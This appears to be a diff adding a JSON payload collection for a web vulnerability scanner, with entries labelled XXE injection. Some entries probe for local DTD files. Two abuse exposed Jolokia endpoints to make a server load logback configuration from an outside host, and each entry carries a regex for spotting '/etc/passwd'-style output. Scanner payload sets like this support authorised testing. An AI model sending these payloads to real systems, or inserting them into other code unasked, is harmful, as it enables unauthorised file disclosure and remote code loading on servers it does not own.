@@ -1,0 +1,79 @@
+[
+  {
+    "payload_id": "OWP-247615",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/usr/share/xml/fontconfig/fonts.dtd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247616",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247617",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/usr/share/xml/svg/svg10.dtd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247618",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/usr/share/xml/svg/svg11.dtd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-247619",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/usr/share/yelp/dtd/docbookx.dtd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-407424",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  },
+  {
+    "payload_id": "OWP-407425",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|ENTITY|xml"
+    }
+  }
+]
